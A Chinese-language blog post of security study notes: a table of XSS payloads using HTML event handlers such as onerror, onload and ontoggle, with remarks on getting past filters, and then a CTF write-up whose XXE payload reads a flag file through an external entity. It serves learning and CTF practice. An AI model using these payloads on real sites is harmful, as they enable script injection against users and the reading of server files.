---
title: "WEB_XSS积累"
image: ''
pinned: false
comment: true
published: 2026-03-27
updated: 2026-04-16
description: "WEB"
category: WEB
tags: [WEB]
---

## 标签的内置事件：

| **标签类型**  | **常用 Payload 示例**                                   | **触发事件**  | **触发条件 / 原理**                          | **优点与局限性**                                     |
| ------------- | ------------------------------------------------------- | ------------- | -------------------------------------------- | ---------------------------------------------------- |
| **图片类**    | `<img src=1 onerror=alert(1)>`                          | `onerror`     | `src` 指定的资源不存在或加载失败时触发。     | **最通用**。即使 `alert` 被过滤，也可配合编码使用。  |
| **矢量图类**  | `<svg onload=alert(1)>`                                 | `onload`      | SVG 元素被解析并插入 DOM 树时触发。          | **最强大**。不需要外部资源，可直接嵌入复杂代码。     |
| **多媒体类**  | `<video><source onerror=alert(1)>`                      | `onerror`     | 视频源加载失败时触发。                       | 常用于绕过针对 `img` 的简单过滤。                    |
|               | `<video onloadstart=alert(1) src=1>`                    | `onloadstart` | 浏览器开始寻找视频资源时触发。               | 无需等待加载失败，响应极快。                         |
|               | `<audio src=1 onerror=alert(1)>`                        | `onerror`     | 音频加载错误时触发。                         | 同 `video`，隐蔽性较好。                             |
| **交互类**    | `<details open ontoggle=alert(1)>`                      | `ontoggle`    | `open` 属性存在时，标签展开状态切换触发。    | **无需资源**。只要标签渲染即触发，现代浏览器兼容好。 |
|               | `<iframe onload=alert(1)></iframe>`                     | `onload`      | 框架内文档加载完成后触发。                   | 适合在独立的沙箱环境中执行代码。                     |
| **表单类**    | `<input autofocus onfocus=alert(1)>`                    | `onfocus`     | `autofocus` 让元素自动获得焦点时触发。       | **静默触发**。不需要用户真的去点击输入框。           |
|               | `<input onblur=alert(1) autofocus>`                     | `onblur`      | 元素失去焦点时触发（通常需两个输入框配合）。 | 适合特定交互场景。                                   |
|               | `<button onmouseover=alert(1)>X</button>`               | `onmouseover` | 鼠标滑过按钮时触发。                         | 需要**用户交互**，但在诱导点击类攻击中有效。         |
|               | `<select onchange=alert(1)><option>1</option></select>` | `onchange`    | 下拉框选项改变时触发。                       | 需要用户操作。                                       |
| **动画/其他** | `<marquee onstart=alert(1)>X</marquee>`                 | `onstart`     | 跑马灯动画开始时触发。                       | 老旧但好用（部分新浏览器已弃用）。                   |
|               | `<body onload=alert(1)>`                                | `onload`      | 整个页面加载完成时触发。                     | 仅限注入点能影响到 `<body>` 标签属性时。             |



----



## XML 外部实体注入漏洞：

原题：**SHCTF--hallenge Info** **-** **[阶段2] Mini Blog**

源码：

```
var xmlData = '<?xml version="1.0" encoding="UTF-8"?><post><title>' + title + '</title><content>' + content + '</content></post>';
fetch('/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/xml' },
    body: xmlData
});
```

期待以post的方法发送xml的数据，而数据是拼接起来的，导致我们可以构造一些恶意的XML的数据直接进入后端，而不被拦截。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE post [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<post>
  <title>hack</title>
  <content>&xxe;</content>
</post>
```

构造的xml数据。

以system的形式去读取flag文件。

































































---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
